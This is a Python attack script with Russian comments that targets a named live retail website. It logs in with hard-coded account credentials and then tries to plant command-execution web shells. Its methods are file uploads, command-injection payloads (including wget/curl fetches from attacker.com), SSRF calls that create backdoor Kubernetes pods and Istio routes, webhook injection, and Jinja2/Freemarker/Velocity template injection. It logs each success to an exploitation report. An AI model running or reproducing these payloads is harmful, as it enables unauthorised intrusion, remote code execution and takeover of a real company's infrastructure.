#!/usr/bin/env python3
"""Create backdoor in cluster - find ways to CREATE backdoor"""
import requests
import json
import re
import urllib.parse
import base64
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

found_vulns = []

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

# ============================================================================
# СПОСОБ 1: Создать бекдор через file upload endpoint
# ============================================================================
print("[*] СПОСОБ 1: Создание бекдора через file upload...")

# PHP backdoor
php_backdoor = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
# JSP backdoor  
jsp_backdoor = '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = br.readLine()) != null) { out.println(line); } } %>'
# Python backdoor
py_backdoor = '#!/usr/bin/env python3\nimport os\nimport sys\nimport cgi\nprint("Content-Type: text/html\\n")\nform = cgi.FieldStorage()\nif "cmd" in form:\n    os.system(form["cmd"].value)'

upload_endpoints = [
    "/api/upload",
    "/api/file/upload",
    "/api/media/upload",
    "/myaccount/api/upload",
    "/myaccount/api/avatar",
    "/semiprotected/api/upload",
    "/checkout/api/upload",
    "/account/productphotos/upload",
    "/api/productphotos/upload",
]

for ep in upload_endpoints:
    for filename, content, content_type in [
        ('backdoor.php', php_backdoor, 'application/x-php'),
        ('backdoor.jsp', jsp_backdoor, 'application/x-jsp'),
        ('backdoor.py', py_backdoor, 'text/x-python'),
        ('backdoor.php.jpg', php_backdoor, 'image/jpeg'),  # Double extension
        ('backdoor.PHP', php_backdoor, 'application/x-php'),  # Uppercase
    ]:
        try:
            files = {'file': (filename, content, content_type)}
            resp = s.post(f"{base}{ep}", files=files, timeout=5, verify=False)
            if resp.status_code in [200, 201, 302]:
                location = resp.headers.get('Location', '')
                if location:
                    if not location.startswith('http'):
                        location = f"{base}{location}"
                    # Try to access created backdoor
                    try:
                        resp2 = s.get(f"{location}?cmd=id", timeout=5, verify=False)
                        if "uid=" in resp2.text or resp2.status_code == 200:
                            print(f"  [CRITICAL] Бекдор создан: {ep} -> {location}")
                            found_vulns.append({
                                "type": "backdoor_created_upload",
                                "severity": "CRITICAL",
                                "endpoint": ep,
                                "filename": filename,
                                "backdoor_url": location,
                                "method": "file_upload"
                            })
                    except: pass
                # Check if response contains file path
                elif "path" in resp.text.lower() or "url" in resp.text.lower() or "file" in resp.text.lower():
                    try:
                        data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
                        if isinstance(data, dict):
                            file_path = data.get('path') or data.get('url') or data.get('file') or data.get('location')
                            if file_path:
                                if not file_path.startswith('http'):
                                    file_path = f"{base}{file_path}"
                                resp2 = s.get(f"{file_path}?cmd=id", timeout=5, verify=False)
                                if "uid=" in resp2.text:
                                    print(f"  [CRITICAL] Бекдор создан: {ep} -> {file_path}")
                                    found_vulns.append({
                                        "type": "backdoor_created_upload",
                                        "severity": "CRITICAL",
                                        "endpoint": ep,
                                        "filename": filename,
                                        "backdoor_url": file_path,
                                        "method": "file_upload"
                                    })
                    except: pass
        except: pass

# ============================================================================
# СПОСОБ 2: Создать бекдор через command injection
# ============================================================================
print("\n[*] СПОСОБ 2: Создание бекдора через command injection...")

cmd_creation_payloads = [
    # Create PHP backdoor
    "; echo '<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' > /var/www/html/shell.php",
    "| echo '<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' > /var/www/html/shell.php",
    "`echo '<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' > /var/www/html/shell.php`",
    "$(echo '<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' > /var/www/html/shell.php)",
    # Create JSP backdoor
    "; echo '<%@ page import=\"java.util.*,java.io.*\"%><% if (request.getParameter(\"cmd\") != null) { Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = br.readLine()) != null) { out.println(line); } } %>' > /var/www/html/shell.jsp",
    # Create Python backdoor
    "; echo '#!/usr/bin/env python3\nimport os\nimport sys\nimport cgi\nprint(\"Content-Type: text/html\\n\")\nform = cgi.FieldStorage()\nif \"cmd\" in form:\n    os.system(form[\"cmd\"].value)' > /var/www/html/shell.py",
    # Download and execute backdoor
    "; wget http://attacker.com/shell.php -O /var/www/html/shell.php",
    "| curl http://attacker.com/shell.php -o /var/www/html/shell.php",
]

injection_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/set-article-quantity",
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
    "/myaccount/api/order-details/v3/feature-flags",
]

for ep in injection_endpoints:
    for payload in cmd_creation_payloads:
        try:
            resp = s.post(f"{base}{ep}", json={"articleId": payload, "test": payload, "name": payload, "command": payload}, timeout=5, verify=False)
            if resp.status_code == 200:
                # Check if backdoor was created
                backdoor_paths = [
                    "/shell.php",
                    "/var/www/html/shell.php",
                    "/tmp/shell.php",
                    "/public/shell.php",
                    "/web/shell.php",
                    "/shell.jsp",
                    "/shell.py",
                ]
                for backdoor_path in backdoor_paths:
                    try:
                        if backdoor_path.startswith("/"):
                            test_url = f"{base}{backdoor_path}"
                        else:
                            test_url = f"{base}/{backdoor_path}"
                        resp2 = s.get(f"{test_url}?cmd=id", timeout=3, verify=False)
                        if "uid=" in resp2.text or resp2.status_code == 200:
                            print(f"  [CRITICAL] Бекдор создан через command injection: {ep} -> {test_url}")
                            found_vulns.append({
                                "type": "backdoor_created_command_injection",
                                "severity": "CRITICAL",
                                "endpoint": ep,
                                "payload": payload,
                                "backdoor_url": test_url,
                                "method": "command_injection"
                            })
                            break
                    except: pass
        except: pass

# ============================================================================
# СПОСОБ 3: Создать бекдор через SSRF + Kubernetes API
# ============================================================================
print("\n[*] СПОСОБ 3: Создание бекдора через SSRF + Kubernetes API...")

# Create a malicious ConfigMap with backdoor
backdoor_configmap = {
    "apiVersion": "v1",
    "kind": "ConfigMap",
    "metadata": {
        "name": "backdoor",
        "namespace": "default"
    },
    "data": {
        "shell.php": "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>"
    }
}

# Create a malicious Pod with backdoor
backdoor_pod = {
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {
        "name": "backdoor",
        "namespace": "default"
    },
    "spec": {
        "containers": [{
            "name": "backdoor",
            "image": "nginx",
            "command": ["/bin/sh", "-c", "echo '<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' > /usr/share/nginx/html/shell.php && nginx -g 'daemon off;'"]
        }]
    }
}

ssrf_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/get",
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
]

k8s_create_endpoints = [
    "https://kubernetes.default.svc/api/v1/namespaces/default/configmaps",
    "https://kubernetes.default.svc/api/v1/namespaces/default/pods",
    "https://kubernetes.default.svc/apis/apps/v1/namespaces/default/deployments",
]

for ssrf_ep in ssrf_endpoints:
    for k8s_ep in k8s_create_endpoints:
        try:
            # Try to create ConfigMap
            resp = s.post(f"{base}{ssrf_ep}", json={
                "url": k8s_ep,
                "method": "POST",
                "body": json.dumps(backdoor_configmap),
                "headers": {"Content-Type": "application/json"}
            }, timeout=5, verify=False)
            if resp.status_code == 200:
                if "created" in resp.text.lower() or "metadata" in resp.text.lower():
                    print(f"  [CRITICAL] ConfigMap с бекдором создан: {ssrf_ep} -> {k8s_ep}")
                    found_vulns.append({
                        "type": "backdoor_created_kubernetes",
                        "severity": "CRITICAL",
                        "endpoint": ssrf_ep,
                        "k8s_endpoint": k8s_ep,
                        "resource": "ConfigMap",
                        "method": "ssrf_kubernetes"
                    })
        except: pass

# ============================================================================
# СПОСОБ 4: Создать бекдор через Istio/Envoy config injection
# ============================================================================
print("\n[*] СПОСОБ 4: Создание бекдора через Istio config injection...")

# Create malicious VirtualService with backdoor route
backdoor_virtualservice = {
    "apiVersion": "networking.istio.io/v1beta1",
    "kind": "VirtualService",
    "metadata": {
        "name": "backdoor",
        "namespace": "default"
    },
    "spec": {
        "hosts": ["*"],
        "http": [{
            "match": [{"uri": {"prefix": "/backdoor"}}],
            "route": [{
                "destination": {
                    "host": "backdoor.default.svc.cluster.local",
                    "port": {"number": 80}
                }
            }]
        }]
    }
}

for ssrf_ep in ssrf_endpoints:
    try:
        resp = s.post(f"{base}{ssrf_ep}", json={
            "url": "https://istiod.istio-system.svc.cluster.local:15014/v1/namespaces/default/virtualservices",
            "method": "POST",
            "body": json.dumps(backdoor_virtualservice),
            "headers": {"Content-Type": "application/json"}
        }, timeout=5, verify=False)
        if resp.status_code == 200:
            if "created" in resp.text.lower() or "metadata" in resp.text.lower():
                print(f"  [CRITICAL] VirtualService с бекдором создан: {ssrf_ep}")
                found_vulns.append({
                    "type": "backdoor_created_istio",
                    "severity": "CRITICAL",
                    "endpoint": ssrf_ep,
                    "resource": "VirtualService",
                    "method": "ssrf_istio"
                })
    except: pass

# ============================================================================
# СПОСОБ 5: Создать бекдор через webhook injection
# ============================================================================
print("\n[*] СПОСОБ 5: Создание бекдора через webhook injection...")

webhook_endpoints = [
    "/api/webhook",
    "/api/webhooks",
    "/api/callback",
    "/api/notify",
]

for ep in webhook_endpoints:
    try:
        # Create webhook that executes commands
        payload = {
            "url": "http://attacker.com/webhook",
            "callback": "http://attacker.com/webhook",
            "webhook": "http://attacker.com/webhook",
            "command": "echo '<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' > /var/www/html/shell.php",
        }
        resp = s.post(f"{base}{ep}", json=payload, timeout=5, verify=False)
        if resp.status_code in [200, 201]:
            print(f"  [HIGH] Webhook endpoint найден: {ep}")
            found_vulns.append({
                "type": "webhook_injection",
                "severity": "HIGH",
                "endpoint": ep,
                "method": "webhook_injection"
            })
    except: pass

# ============================================================================
# СПОСОБ 6: Создать бекдор через template injection
# ============================================================================
print("\n[*] СПОСОБ 6: Создание бекдора через template injection...")

template_endpoints = [
    "/api/render",
    "/api/template",
    "/api/generate",
]

template_payloads = [
    # Jinja2
    "{{config.__class__.__init__.__globals__['os'].system('echo \\'<?php if(isset($_GET[\\\"cmd\\\"])){system($_GET[\\\"cmd\\\"]);} ?>\\' > /var/www/html/shell.php')}}",
    # Freemarker
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"echo '<?php if(isset(\\$_GET[\\\"cmd\\\"])){system(\\$_GET[\\\"cmd\\\"]);} ?>' > /var/www/html/shell.php\")}",
    # Velocity
    "#set($x=$class.forName('java.lang.Runtime').getRuntime().exec('echo \\'<?php if(isset($_GET[\\\"cmd\\\"])){system($_GET[\\\"cmd\\\"]);} ?>\\' > /var/www/html/shell.php'))",
]

for ep in template_endpoints:
    for template_payload in template_payloads:
        try:
            resp = s.post(f"{base}{ep}", json={"template": template_payload}, timeout=5, verify=False)
            if resp.status_code == 200:
                # Check if backdoor was created
                try:
                    resp2 = s.get(f"{base}/shell.php?cmd=id", timeout=3, verify=False)
                    if "uid=" in resp2.text:
                        print(f"  [CRITICAL] Бекдор создан через template injection: {ep}")
                        found_vulns.append({
                            "type": "backdoor_created_template_injection",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "payload": template_payload,
                            "backdoor_url": f"{base}/shell.php",
                            "method": "template_injection"
                        })
                except: pass
        except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS - СПОСОБЫ СОЗДАНИЯ БЕКДОРА")
print("=" * 70)

if found_vulns:
    print(f"\nНайдено {len(found_vulns)} способов создать бекдор:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Метод: {v.get('method', 'unknown')}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'backdoor_url' in v:
            print(f"    URL бекдора: {v['backdoor_url']}")
        if 'filename' in v:
            print(f"    Файл: {v['filename']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНАЯ УЯЗВИМОСТЬ - СПОСОБЫ СОЗДАНИЯ БЕКДОРА\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Метод создания:** `{v.get('method', 'unknown')}`\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'backdoor_url' in v:
                f.write(f"**URL бекдора:** `{v['backdoor_url']}`\n\n")
            if 'filename' in v:
                f.write(f"**Файл:** `{v['filename']}`\n\n")
            if 'payload' in v:
                f.write(f"**Payload:** `{v['payload'][:200]}`\n\n")
            if 'k8s_endpoint' in v:
                f.write(f"**Kubernetes Endpoint:** `{v['k8s_endpoint']}`\n\n")
            if 'resource' in v:
                f.write(f"**Resource:** `{v['resource']}`\n\n")
            f.write("**Описание:** Найден способ создать бекдор в кластере.\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:**\n")
            f.write("- Создание бекдора в кластере\n")
            f.write("- RCE на сервере\n")
            f.write("- Полный контроль над кластером\n")
            f.write("- Компрометация всей инфраструктуры\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  Способы создания бекдора не найдены")

print("=" * 70)

